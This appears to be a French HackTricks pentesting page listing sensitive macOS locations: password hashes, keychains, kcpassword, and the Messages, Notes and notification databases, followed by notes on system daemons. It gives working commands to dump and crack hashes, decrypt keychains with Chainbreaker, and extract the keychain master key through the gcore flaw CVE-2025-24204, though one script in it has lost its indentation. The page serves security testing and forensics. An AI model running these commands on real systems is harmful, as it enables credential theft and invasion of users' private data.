# Emplacements sensibles et daemons intéressants de macOS

{{#include ../../../banners/hacktricks-training.md}}

## Mots de passe

### Shadow Passwords

Shadow password est stocké avec la configuration de l'utilisateur dans des plists situés dans **`/var/db/dslocal/nodes/Default/users/`**.\
Le oneliner suivant peut être utilisé pour dumper **toutes les informations sur les utilisateurs** (y compris les informations sur les hash) :
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
[**Des scripts comme celui-ci**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) ou [**celui-ci**](https://github.com/octomagon/davegrohl.git) peuvent être utilisés pour transformer le hash au **format** **hashcat**.

Une autre commande en une ligne qui récupérera les identifiants de tous les comptes qui ne sont pas des comptes de service au format hashcat `-m 7100` (macOS PBKDF2-SHA512) :
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
Une autre façon d'obtenir le `ShadowHashData` d'un utilisateur consiste à utiliser `dscl` : `` sudo dscl . -read /Users/`whoami` ShadowHashData ``

### /etc/master.passwd

Ce fichier est **uniquement utilisé** lorsque le système démarre en **single-user mode** (donc pas très fréquemment).

### Keychain Dump

Notez que lors de l'utilisation du binaire `security` pour **dump les mots de passe déchiffrés**, plusieurs invites demanderont à l'utilisateur d'autoriser cette opération.
```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
Sur les versions modernes de macOS, les backing stores les plus intéressants sont généralement **`~/Library/Keychains/login.keychain-db`** et **`/Library/Keychains/System.keychain`**. Ce sont des fichiers reposant sur SQLite, mais l'accès en clair reste brokered par **`securityd`** : le vol de la DB brute fournit principalement des métadonnées et des blobs chiffrés, sauf si vous récupérez également le mot de passe de l'utilisateur, `SystemKey` ou une master key en mémoire.<sup>[[2]](#references)</sup>

### [Keychaindump](https://github.com/juuso/keychaindump)

> [!CAUTION]
> D'après ce commentaire [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760), il semble que ces outils ne fonctionnent plus dans Big Sur.

### Présentation de Keychaindump

Un outil nommé **keychaindump** a été développé pour extraire des mots de passe des keychains macOS, mais il présente des limitations sur les versions récentes de macOS, comme Big Sur, comme l'indique une [discussion](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). L'utilisation de **keychaindump** nécessite que l'attaquant obtienne un accès et élève ses privilèges jusqu'à **root**. L'outil exploite le fait que la keychain est déverrouillée par défaut lors de la connexion de l'utilisateur, pour des raisons pratiques, ce qui permet aux applications d'y accéder sans demander à nouveau le mot de passe de l'utilisateur. Cependant, si un utilisateur choisit de verrouiller sa keychain après chaque utilisation, **keychaindump** devient inefficace.

**Keychaindump** fonctionne en ciblant un processus spécifique appelé **securityd**, décrit par Apple comme un daemon chargé de l'autorisation et des opérations cryptographiques, essentiel pour accéder à la keychain. Le processus d'extraction consiste à identifier une **Master Key** dérivée du mot de passe de connexion de l'utilisateur. Cette clé est indispensable pour lire le fichier de la keychain. Pour localiser la **Master Key**, **keychaindump** scanne le tas mémoire de **securityd** à l'aide de la commande `vmmap`, à la recherche de clés potentielles dans les zones marquées **`MALLOC_TINY`**. La commande suivante est utilisée pour inspecter ces emplacements mémoire :
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
Après avoir identifié les clés maîtresses potentielles, **keychaindump** recherche dans les heaps un motif spécifique (`0x0000000000000018`) indiquant un candidat pour la clé maîtresse. Des étapes supplémentaires, notamment la désobfuscation, sont nécessaires pour utiliser cette clé, comme indiqué dans le code source de **keychaindump**. Les analystes qui se concentrent sur ce domaine doivent noter que les données essentielles au déchiffrement du trousseau sont stockées dans la mémoire du processus **securityd**. Voici un exemple de commande pour exécuter **keychaindump** :
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) peut être utilisé pour extraire les types d'informations suivants d'un keychain OSX, de manière fiable sur le plan forensique :

- Mot de passe Keychain hache, compatible avec le cracking via [hashcat](https://hashcat.net/hashcat/) ou [John the Ripper](https://www.openwall.com/john/)
- Mots de passe Internet
- Mots de passe generiques
- Cles privees
- Cles publiques
- Certificats X509
- Notes securisees
- Mots de passe Appleshare

Avec le mot de passe de deverrouillage du keychain, une master key obtenue avec [volafox](https://github.com/n0fate/volafox) ou [volatility](https://github.com/volatilityfoundation/volatility), ou un fichier de deverrouillage tel que SystemKey, Chainbreaker fournira egalement les mots de passe en clair.

Sans l'une de ces methodes de deverrouillage du Keychain, Chainbreaker affichera toutes les autres informations disponibles.

#### **Dump keychain keys**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **Dump des clés du keychain (avec les mots de passe) avec SystemKey**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump des clés du keychain (avec les mots de passe) : cracking du hash**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Extraire les clés du trousseau (avec les mots de passe) avec un dump mémoire**

[Suivez ces étapes](../index.html#dumping-memory-with-osxpmem) pour effectuer un **dump mémoire**
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump des clés de keychain (avec les mots de passe) à l’aide du mot de passe de l’utilisateur**

Si vous connaissez le mot de passe de l’utilisateur, vous pouvez l’utiliser pour **dump et déchiffrer les keychains appartenant à l’utilisateur**.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### Clé maître de Keychain via l’entitlement `gcore` (CVE-2025-24204)

macOS 15.0 (Sequoia) fournissait `/usr/bin/gcore` avec l’entitlement **`com.apple.system-task-ports.read`**, permettant ainsi à tout administrateur local (ou à toute application signée malveillante) de dumper la mémoire de n’importe quel processus, même lorsque SIP/TCC étaient appliqués. Le dump de `securityd` expose la **clé maître de Keychain** en clair et permet de déchiffrer `login.keychain-db` sans le mot de passe de l’utilisateur.<sup>[[1]](#references)</sup>

**Reproduction rapide sur les builds vulnérables (15.0–15.2) :**
```bash
sudo pgrep securityd        # usually a single PID
sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
python3 - <<'PY'
import mmap,re,sys
with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
c=m.group(0)
if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
PY $(pgrep securityd)
```
Fournissez la clé hexadécimale extraite à Chainbreaker (`--key <hex>`) pour déchiffrer le trousseau de connexion. Apple a supprimé l’entitlement dans **macOS 15.3+** ; cela ne fonctionne donc que sur les builds Sequoia non corrigés ou les systèmes ayant conservé le binaire vulnérable.

### kcpassword

Le fichier **kcpassword** contient le **mot de passe de connexion de l’utilisateur**, mais uniquement si le propriétaire du système a **activé la connexion automatique**. L’utilisateur sera donc automatiquement connecté sans qu’un mot de passe lui soit demandé (ce qui n’est pas très sécurisé).

Le mot de passe est stocké dans le fichier **`/etc/kcpassword`**, après avoir été soumis à une opération XOR avec la clé **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. Si le mot de passe de l’utilisateur est plus long que la clé, celle-ci sera réutilisée.\
Cela rend le mot de passe assez facile à récupérer, par exemple à l’aide de scripts comme [**celui-ci**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Informations intéressantes dans les bases de données

### Messages
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Notifications

Avant **Sequoia**, vous pouvez généralement trouver la base de données de Notification Center dans **`$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db`**. Dans **Sequoia+**, Apple l’a déplacée vers le group container protégé par TCC **`$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db`**.

La plupart des informations intéressantes sont stockées dans des colonnes **blob**. Vous devrez donc extraire ce contenu et le transformer dans un format lisible (`plutil -p -`, `strings` ou un petit parser). Exemples de triage rapide :
```bash
# Legacy location (older releases / affected builds)
DA=$(getconf DARWIN_USER_DIR)
strings "$DA/com.apple.notificationcenter/db2/db" | grep -i -A4 slack
sqlite3 "$DA/com.apple.notificationcenter/db2/db"   "select hex(data) from record order by delivered_date desc limit 1;" | xxd -r -p - | plutil -p -

# Sequoia+ location (TCC-protected)
sqlite3 "$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db"   "select app_identifier, presented, datetime(delivered_date+978307200,'unixepoch'), hex(data) from record order by delivered_date desc limit 5;"
```
#### Problèmes récents de confidentialité (base de données NotificationCenter)

- Dans macOS **14.7–15.1**, Apple stockait le contenu des bannières dans la base SQLite `db2/db` sans le caviarder correctement. Les CVE **CVE-2024-44292/44293/40838/54504** permettaient à tout utilisateur local de lire le texte des notifications des autres utilisateurs simplement en ouvrant la base de données (sans invite TCC).
- Apple a corrigé ce problème en déplaçant la base de données dans `group.com.apple.usernoted` et en la protégeant avec TCC dans les versions plus récentes de Sequoia. Sur les systèmes actuels, il faut donc généralement disposer du contexte du bon utilisateur ou d'un TCC bypass pour la lire.<sup>[[3]](#references)</sup>
- Sur les anciens endpoints, copiez les fichiers `db`, `db-wal` et `db-shm` ensemble avant une mise à jour ou un redémarrage si vous souhaitez préserver les artefacts.

### Remarques

Les **notes** des utilisateurs se trouvent dans `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

# ZICNOTEDATA.ZDATA is usually a gzip-compressed protobuf blob
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.z ; done
```
Si le one-liner ci-dessus génère trop de bruit, exportez `ZICNOTEDATA.ZDATA`, décompressez-le avec gunzip, puis parsez le protobuf : cette méthode est généralement plus fiable que l’exécution directe de `strings` sur la base SQLite.

### Tâches en arrière-plan / Éléments d’ouverture de session

Depuis **Ventura**, les éléments d’ouverture de session approuvés par l’utilisateur et plusieurs tâches en arrière-plan sont suivis dans les stores **BTM**, tels que **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm`** et le cache système versionné **`/private/var/db/com.apple.backgroundtaskmanagement/BackgroundItems-v<xx>.btm`**.

Ces fichiers sont utiles pour identifier rapidement la persistence, les outils auxiliaires et certains éléments en arrière-plan gérés par MDM :
```bash
plutil -p ~/Library/Application\ Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm | head -100
sfltool dumpbtm
```
Pour l'aspect persistance et les mécanismes internes de BTM, consultez [la page sur les emplacements d'auto-démarrage](../../macos-auto-start-locations.md#login-items) et [les notes sur Background Tasks Management](../macos-security-protections/README.md#background-tasks-management).

## Préférences

Dans les applications macOS, les préférences se trouvent dans **`$HOME/Library/Preferences`**, tandis que dans iOS, elles se trouvent dans `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.

Sous macOS, l'outil cli **`defaults`** peut être utilisé pour **modifier le fichier de préférences**.

**`/usr/sbin/cfprefsd`** revendique les services XPC `com.apple.cfprefsd.daemon` et `com.apple.cfprefsd.agent` et peut être appelé pour effectuer des actions telles que la modification des préférences.

## OpenDirectory permissions.plist

Le fichier `/System/Library/OpenDirectory/permissions.plist` contient les permissions appliquées aux attributs des nœuds et est protégé par SIP.\
Ce fichier accorde des permissions à des utilisateurs spécifiques via leur UUID (et non leur uid), afin qu'ils puissent accéder à certaines informations sensibles telles que `ShadowHashData`, `HeimdalSRPKey` et `KerberosKeys`, entre autres :
```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
<key>dsAttrTypeNative:ShadowHashData</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
<key>dsAttrTypeNative:KerberosKeys</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
[...]
```
## Notifications système

### Notifications Darwin

Le daemon principal pour les notifications est **`/usr/sbin/notifyd`**. Pour recevoir des notifications, les clients doivent s'enregistrer via le port Mach `com.apple.system.notification_center` (vérifiez-les avec `sudo lsmp -p <pid notifyd>`). Le daemon est configurable avec le fichier `/etc/notify.conf`.

Les noms utilisés pour les notifications sont des notations DNS inversées uniques et, lorsqu'une notification est envoyée à l'un d'eux, le ou les clients ayant indiqué pouvoir la gérer la reçoivent.

Il est possible d'extraire l'état actuel (et de voir tous les noms) en envoyant le signal SIGUSR2 au processus notifyd, puis en lisant le fichier généré : `/var/run/notifyd_<pid>.status` :
```bash
ps -ef | grep -i notifyd
0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
memory: com.apple.system.timezone
common: com.apple.analyticsd.running
common: com.apple.CFPreferences._domainsChangedExternally
common: com.apple.security.octagon.joined-with-bottle
[...]
```
### Centre de notifications distribué

Le **Centre de notifications distribué**, dont le binaire principal est **`/usr/sbin/distnoted`**, constitue une autre manière d'envoyer des notifications. Il expose certains services XPC et effectue quelques vérifications pour tenter de vérifier les clients.

### Apple Push Notifications (APN)

Dans ce cas, les applications peuvent s'enregistrer pour des **topics**. Le client génère un token en contactant les serveurs d'Apple via **`apsd`**.\
Ensuite, les providers auront également généré un token et pourront se connecter aux serveurs d'Apple pour envoyer des messages aux clients. Ces messages seront reçus localement par **`apsd`**, qui transmettra la notification à l'application en attente.

Les préférences se trouvent dans `/Library/Preferences/com.apple.apsd.plist`.

Une base de données locale contenant les messages se trouve dans macOS à `/Library/Application\ Support/ApplePushService/aps.db` et dans iOS à `/var/mobile/Library/ApplePushService`. Elle contient 3 tables : `incoming_messages`, `outgoing_messages` et `channel`.
```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```
Il est également possible d’obtenir des informations sur le daemon et les connexions à l’aide de :
```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```
## Notifications utilisateur

Voici les notifications que l'utilisateur devrait voir à l'écran :

- **`CFUserNotification`** : cette API permet d'afficher une fenêtre contextuelle contenant un message à l'écran.
- **The Bulletin Board** : cette fonctionnalité affiche dans iOS une bannière qui disparaît et est stockée dans le Centre de notifications.
- **`NSUserNotificationCenter`** : il s'agit de The Bulletin Board d'iOS dans macOS. Dans les anciennes versions de macOS, la base de données se trouve généralement dans `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db` ; depuis Sequoia, elle a été déplacée vers `~/Library/Group Containers/group.com.apple.usernoted/db2/db`.

## Références

- [1] [HelpNetSecurity – l'entitlement gcore de macOS permettait l'extraction de la clé principale du Keychain (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
- [2] [Apple Platform Security – protection des données du Keychain](https://support.apple.com/guide/security/keychain-data-protection-secb0694df1a/web)
- [3] [9to5Mac – Apple répond aux préoccupations relatives à la confidentialité de la base de données du Centre de notifications dans macOS Sequoia](https://9to5mac.com/2024/09/01/security-bite-apple-addresses-privacy-concerns-around-notification-center-database-in-macos-sequoia/)

{{#include ../../../banners/hacktricks-training.md}}
